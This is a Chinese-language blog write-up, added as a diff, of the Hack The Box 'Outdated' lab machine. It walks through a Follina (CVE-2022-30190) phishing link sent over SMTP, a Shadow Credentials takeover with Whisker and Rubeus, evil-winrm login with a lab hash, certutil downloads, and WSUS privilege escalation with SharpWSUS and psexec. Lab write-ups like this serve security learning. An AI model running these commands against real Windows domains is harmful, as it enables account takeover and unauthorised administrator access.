@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Get btables user  一切开始之前都必须要将需要的域名添加到&#x2F;etc&#x2F;hosts   get information in shares smbmap发现我们在shares盘是有权限访问的，文件夹里面有一个公告文件，打开NOC_Reminder.pdf，文件部分原文 12As we work to rebuild, please assist our NOC by e-mailin">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Outdated Machine Challenge">
+<meta property="og:url" content="http://example.com/2022/09/15/htb-outdated/index.html">
+<meta property="og:site_name" content="a0dy&#39;s Home">
+<meta property="og:description" content="Get btables user  一切开始之前都必须要将需要的域名添加到&#x2F;etc&#x2F;hosts   get information in shares smbmap发现我们在shares盘是有权限访问的，文件夹里面有一个公告文件，打开NOC_Reminder.pdf，文件部分原文 12As we work to rebuild, please assist our NOC by e-mailin">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/pictures/btables_outdated_htb_bloodhound.png">
+<meta property="article:published_time" content="2022-09-15T07:00:00.000Z">
+<meta property="article:modified_time" content="2023-03-19T09:40:34.666Z">
+<meta property="article:author" content="Andy">
+<meta property="article:tag" content="CVE-2022-30190 [Zero-Day]">
+<meta property="article:tag" content="Active Dirctory">
+<meta property="article:tag" content="Privilege Elevation">
+<meta property="article:tag" content="Shadow Credential">
+<meta property="article:tag" content="WSUS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/pictures/btables_outdated_htb_bloodhound.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HTB Outdated Machine Challenge</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/09/16/htb-health/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/08/30/pwn-start-intro/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/09/15/htb-outdated/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/09/15/htb-outdated/&text=HTB Outdated Machine Challenge"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/09/15/htb-outdated/&title=HTB Outdated Machine Challenge"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/09/15/htb-outdated/&is_video=false&description=HTB Outdated Machine Challenge"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB Outdated Machine Challenge&body=Check out this article: http://example.com/2022/09/15/htb-outdated/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/09/15/htb-outdated/&title=HTB Outdated Machine Challenge"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/09/15/htb-outdated/&title=HTB Outdated Machine Challenge"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/09/15/htb-outdated/&title=HTB Outdated Machine Challenge"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/09/15/htb-outdated/&title=HTB Outdated Machine Challenge"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/09/15/htb-outdated/&name=HTB Outdated Machine Challenge&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/09/15/htb-outdated/&t=HTB Outdated Machine Challenge"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#get-btables-user"><span class="toc-number">1.</span> <span class="toc-text"> Get btables user</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#get-information-in-shares"><span class="toc-number">1.1.</span> <span class="toc-text"> get information in shares</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#download-follina-from-github"><span class="toc-number">1.2.</span> <span class="toc-text"> download follina from github</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pentest-smtp-port-using-telnet"><span class="toc-number">1.3.</span> <span class="toc-text"> pentest smtp port using telnet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pentest-smtp-using-swaskrecommend"><span class="toc-number">1.4.</span> <span class="toc-text"> pentest smtp using swask{recommend}</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-domain-info"><span class="toc-number">2.</span> <span class="toc-text"> Get Domain-Info</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pre-knowledge"><span class="toc-number">2.1.</span> <span class="toc-text"> pre knowledge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#infomation"><span class="toc-number">2.2.</span> <span class="toc-text"> Infomation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bloodhound-time"><span class="toc-number">2.3.</span> <span class="toc-text"> BloodHound time!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#takeover-sflowers"><span class="toc-number">3.</span> <span class="toc-text"> Takeover sflowers</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#into-root"><span class="toc-number">4.</span> <span class="toc-text"> Into ROOT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#local-privilege-escalation-detect"><span class="toc-number">4.1.</span> <span class="toc-text"> local privilege escalation detect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#compile-wsuspicious-to-binary"><span class="toc-number">4.2.</span> <span class="toc-text"> compile WSuspicious to binary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hack-root"><span class="toc-number">4.3.</span> <span class="toc-text"> hack root</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sharp-my-weapon"><span class="toc-number">4.4.</span> <span class="toc-text"> sharp my weapon</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#summary"><span class="toc-number">5.</span> <span class="toc-text"> Summary</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        HTB Outdated Machine Challenge
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Andy</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-09-15T07:00:00.000Z" itemprop="datePublished">2022-09-15</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Machine/">Machine</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Active-Dirctory/" rel="tag">Active Dirctory</a>, <a class="tag-link-link" href="/tags/CVE-2022-30190-Zero-Day/" rel="tag">CVE-2022-30190 [Zero-Day]</a>, <a class="tag-link-link" href="/tags/Privilege-Elevation/" rel="tag">Privilege Elevation</a>, <a class="tag-link-link" href="/tags/Shadow-Credential/" rel="tag">Shadow Credential</a>, <a class="tag-link-link" href="/tags/WSUS/" rel="tag">WSUS</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="get-btables-user"><a class="markdownIt-Anchor" href="#get-btables-user"></a> Get btables user</h2>
+<blockquote>
+<p>一切开始之前都必须要将需要的域名添加到<code>/etc/hosts</code></p>
+</blockquote>
+<h3 id="get-information-in-shares"><a class="markdownIt-Anchor" href="#get-information-in-shares"></a> get information in shares</h3>
+<p><code>smbmap</code>发现我们在shares盘是有权限访问的，文件夹里面有一个公告文件，打开<code>NOC_Reminder.pdf</code>，文件部分原文</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">As we work to rebuild, please assist our NOC by e-mailing a link to any internal web applications to</span><br><span class="line">itsupport@outdated.htb so we can get them added back into our monitoring platform for alerts and notifications.</span><br></pre></td></tr></table></figure>
+<p>可以发现itsupport@outdated.htb可以发送内部应用程序的链接，通过添加到嗅探器来提示</p>
+<h3 id="download-follina-from-github"><a class="markdownIt-Anchor" href="#download-follina-from-github"></a> download follina from github</h3>
+<p><a target="_blank" rel="noopener" href="https://github.com/JohnHammond/msdt-follina">Github Link</a>,这是对CVE-2022-30190的PoC但也可以直接来exploit本机器，下载下来后阅读说明方法。</p>
+<blockquote>
+<p>机器的邮件探测这一部分我个人认为是有大问题的，不管我是发送文本内容<code>http://10.10.XX.XX:8000/</code>(8000默认端口)，还是<code>http://10.10.XX.XX/</code>,都只能在本地监听80端口上得到相应，我初步怀疑是机器的适配没有做好。所以我改变了本地服务器监听端口并且更改了follina默认8000端口为80端口以更好地让机器添加正确的内部应用程序链接来触发漏洞。</p>
+</blockquote>
+<p>需要编辑脚本将<code>nc64</code>的下载链接替换为你本地下载服务器链接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8080</span><br><span class="line">python3 follina.py -p 80 -i tun0 -r 2710</span><br></pre></td></tr></table></figure>
+<h3 id="pentest-smtp-port-using-telnet"><a class="markdownIt-Anchor" href="#pentest-smtp-port-using-telnet"></a> pentest smtp port using telnet</h3>
+<p>接下来发送邮件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">telnet mail.outdated.htb 25</span><br><span class="line">Trying 10.10.11.175...</span><br><span class="line">Connected to outdated.htb.</span><br><span class="line">Escape character is &#x27;^]&#x27;.</span><br><span class="line">220 mail.outdated.htb ESMTP</span><br><span class="line">ehlo kali</span><br><span class="line">250-mail.outdated.htb</span><br><span class="line">250-SIZE 20480000</span><br><span class="line">250-AUTH LOGIN</span><br><span class="line">250 HELP</span><br><span class="line">mail from:&lt;kali@test&gt;</span><br><span class="line">250 OK</span><br><span class="line">rcpt to:&lt;itsupport@outdated.htb&gt;</span><br><span class="line">250 OK</span><br><span class="line">data</span><br><span class="line">354 OK, send.</span><br><span class="line">to: itsupport@outdated.htb</span><br><span class="line">from kali@test</span><br><span class="line">subject: test title</span><br><span class="line"></span><br><span class="line">http://10.10.XX.XX/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.</span><br><span class="line">250 Queued (30.006 seconds)</span><br><span class="line">quit</span><br><span class="line">221 goodbye</span><br><span class="line">Connection closed by foreign host.</span><br></pre></td></tr></table></figure>
+<h3 id="pentest-smtp-using-swaskrecommend"><a class="markdownIt-Anchor" href="#pentest-smtp-using-swaskrecommend"></a> pentest smtp using swask{recommend}</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swaks --to itsupport@outdated.htb --from kali@test --server mail.outdated.htb --body &quot;http://10.10.XX.XX/&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="get-domain-info"><a class="markdownIt-Anchor" href="#get-domain-info"></a> Get Domain-Info</h2>
+<h3 id="pre-knowledge"><a class="markdownIt-Anchor" href="#pre-knowledge"></a> pre knowledge</h3>
+<p>Active Directory: <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology">Click Me</a></p>
+<p>Kerberos Working Process: <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-authentication">Click Me</a></p>
+<p>Basic CMD for pentesters:(Domain Section) <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/basic-cmd-for-pentesters#domain-info">Click Me</a></p>
+<p>BloodHound: <a target="_blank" rel="noopener" href="https://bloodhound.readthedocs.io/en/latest/index.html">Click Me</a></p>
+<h3 id="infomation"><a class="markdownIt-Anchor" href="#infomation"></a> Infomation</h3>
+<p>在一切之前我们需要获取一些基本的domain信息</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span>:net user /domain</span><br><span class="line">The request will be processed at a domain controller <span class="keyword">for</span> domain outdated.htb.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User accounts <span class="keyword">for</span> \\DC.outdated.htb</span><br><span class="line"></span><br><span class="line"><span class="literal">-------------------------------------------------------------------------------</span></span><br><span class="line">Administrator            btables                  Guest                    </span><br><span class="line">krbtgt                   sflowers                 </span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure>
+<p>可以看到一下是 <code>\\DC.outdated.htb</code>的用户列表，我们需要做的是从btables用户登录到目标计算机</p>
+<h3 id="bloodhound-time"><a class="markdownIt-Anchor" href="#bloodhound-time"></a> BloodHound time!</h3>
+<p>用BloodHound扫描一下，发现了可行路径：<br />
+<img src="/pictures/btables_outdated_htb_bloodhound.png" alt="way_to_dc_outdated_htb" /></p>
+<p>图像很明了就不分析了</p>
+<h2 id="takeover-sflowers"><a class="markdownIt-Anchor" href="#takeover-sflowers"></a> Takeover sflowers</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The members of the group ITSTAFF@OUTDATED.HTB have the ability to write to the &quot;msds-KeyCredentialLink&quot; property on SFLOWERS@OUTDATED.HTB. Writing to this property allows an attacker to create &quot;Shadow Credentials&quot; on the object and authenticate as the principal using kerberos PKINIT.</span><br></pre></td></tr></table></figure>
+<p>这里需要用到的是<code>Shadow Credentials</code>技术</p>
+<ul>
+<li>阅读<a target="_blank" rel="noopener" href="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab">这篇文章</a></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># Upload Files</span><br><span class="line">certutil.exe -urlcache -f http://&#123;your_server&#125;/&#123;file_name&#125; &#123;file_name&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Abuse &quot;AddKeyCredentials&quot; privilege</span><br><span class="line">Whisker.exe add /target:sflowers</span><br><span class="line"></span><br><span class="line"># Enter home</span><br><span class="line">Rubeus.exe asktgt /user:sflowers /certificate:&lt;your_base64_cert&gt; /password:&quot;FXqY4qoqtORvgmC9&quot; /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show</span><br><span class="line">evil-winrm -i outdated.htb -u sflowers -H 1FCDB1F6015DCB318CC77BB2BDA14DB5</span><br></pre></td></tr></table></figure>
+<h2 id="into-root"><a class="markdownIt-Anchor" href="#into-root"></a> Into ROOT</h2>
+<h3 id="local-privilege-escalation-detect"><a class="markdownIt-Anchor" href="#local-privilege-escalation-detect"></a> local privilege escalation detect</h3>
+<p>这里需要用到<code>PEASS-ng</code>，来进行本地提权检测，不得不说这个软件在应付常规提权是真的好用！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Upload File</span><br><span class="line"># run winPEAS.exe</span><br><span class="line">Checking WSUS............</span><br><span class="line">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus</span><br><span class="line">WSUS is using http: http://wsus.outdated.htb:8530</span><br><span class="line">You can test https://github.com/pimps/wsuxploit to escalate privileges</span><br><span class="line">And UseWUServer is equals to 1, so it is vulnerable!</span><br></pre></td></tr></table></figure>
+<h3 id="compile-wsuspicious-to-binary"><a class="markdownIt-Anchor" href="#compile-wsuspicious-to-binary"></a> compile WSuspicious to binary</h3>
+<p>仓库并没有直接发布二进制版本，很多C# 的工具都需要我们自己编译，首先编译然后上传</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># compile</span><br><span class="line">dotnet msbuild /t:Restore /t:Clean /t:Build /p:Configuration=Release /p:DebugSymbols=false /p:DebugType=None /t:ILMerge /p:TrimUnusedDependencies=true</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>千万不要现在最新版的visual studio来编译！不然等着踩坑，推荐2019</p>
+</blockquote>
+<h3 id="hack-root"><a class="markdownIt-Anchor" href="#hack-root"></a> hack root</h3>
+<p>详细参见：<a target="_blank" rel="noopener" href="https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/">WSUSATtack</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># run custom command line</span><br><span class="line">./WSuspicious.exe /command:&quot; -accepteula -s -d cmd /c &quot;&quot;net localgroup Administrators sflowers /add&quot;&quot;&quot; /autoinstall</span><br></pre></td></tr></table></figure>
+<p>这里试了很久都不行，也许是服务器禁用了本地代理？</p>
+<h3 id="sharp-my-weapon"><a class="markdownIt-Anchor" href="#sharp-my-weapon"></a> sharp my weapon</h3>
+<p>还在维护中的工具: <a target="_blank" rel="noopener" href="https://github.com/nettitude/SharpWSUS">Github</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># create update</span><br><span class="line">./SharpWsus.exe create /payload:&quot;C:\Users\sflowers\Documents\psexec.exe&quot; /args:&quot;-accepteula -s -d cmd.exe /c net localgroup administrators sflowers /add&quot; /title:&quot;update released&quot;</span><br><span class="line"></span><br><span class="line"># apply update</span><br><span class="line">./SharpWsus.exe approve /updateid:&#123;update_code&#125; /computername:dc.outdated.htb /groupname:&quot;whatever&quot;</span><br><span class="line"></span><br><span class="line"># check already</span><br><span class="line">./SharpWsus.exe check /updateid:&#123;update_code&#125; /computername:dc.outdated.htb</span><br></pre></td></tr></table></figure>
+<p>不要反复提交更新，可能会出BUG（机器不太稳定），如果目标机的update一直处于not installed的状态需要多等待一会儿</p>
+<h2 id="summary"><a class="markdownIt-Anchor" href="#summary"></a> Summary</h2>
+<p>这个试验机说实话有点恶心到我了，还处于极度不稳定状态，在第一天release的时候还出现了ZeroLogon的漏洞，糟糕的一次体验。不过好在学到了不少东西！</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#get-btables-user"><span class="toc-number">1.</span> <span class="toc-text"> Get btables user</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#get-information-in-shares"><span class="toc-number">1.1.</span> <span class="toc-text"> get information in shares</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#download-follina-from-github"><span class="toc-number">1.2.</span> <span class="toc-text"> download follina from github</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pentest-smtp-port-using-telnet"><span class="toc-number">1.3.</span> <span class="toc-text"> pentest smtp port using telnet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pentest-smtp-using-swaskrecommend"><span class="toc-number">1.4.</span> <span class="toc-text"> pentest smtp using swask{recommend}</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-domain-info"><span class="toc-number">2.</span> <span class="toc-text"> Get Domain-Info</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pre-knowledge"><span class="toc-number">2.1.</span> <span class="toc-text"> pre knowledge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#infomation"><span class="toc-number">2.2.</span> <span class="toc-text"> Infomation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bloodhound-time"><span class="toc-number">2.3.</span> <span class="toc-text"> BloodHound time!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#takeover-sflowers"><span class="toc-number">3.</span> <span class="toc-text"> Takeover sflowers</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#into-root"><span class="toc-number">4.</span> <span class="toc-text"> Into ROOT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#local-privilege-escalation-detect"><span class="toc-number">4.1.</span> <span class="toc-text"> local privilege escalation detect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#compile-wsuspicious-to-binary"><span class="toc-number">4.2.</span> <span class="toc-text"> compile WSuspicious to binary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hack-root"><span class="toc-number">4.3.</span> <span class="toc-text"> hack root</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sharp-my-weapon"><span class="toc-number">4.4.</span> <span class="toc-text"> sharp my weapon</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#summary"><span class="toc-number">5.</span> <span class="toc-text"> Summary</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/09/15/htb-outdated/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/09/15/htb-outdated/&text=HTB Outdated Machine Challenge"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/09/15/htb-outdated/&title=HTB Outdated Machine Challenge"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/09/15/htb-outdated/&is_video=false&description=HTB Outdated Machine Challenge"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB Outdated Machine Challenge&body=Check out this article: http://example.com/2022/09/15/htb-outdated/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/09/15/htb-outdated/&title=HTB Outdated Machine Challenge"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/09/15/htb-outdated/&title=HTB Outdated Machine Challenge"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/09/15/htb-outdated/&title=HTB Outdated Machine Challenge"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/09/15/htb-outdated/&title=HTB Outdated Machine Challenge"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/09/15/htb-outdated/&name=HTB Outdated Machine Challenge&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/09/15/htb-outdated/&t=HTB Outdated Machine Challenge"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    Andy
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
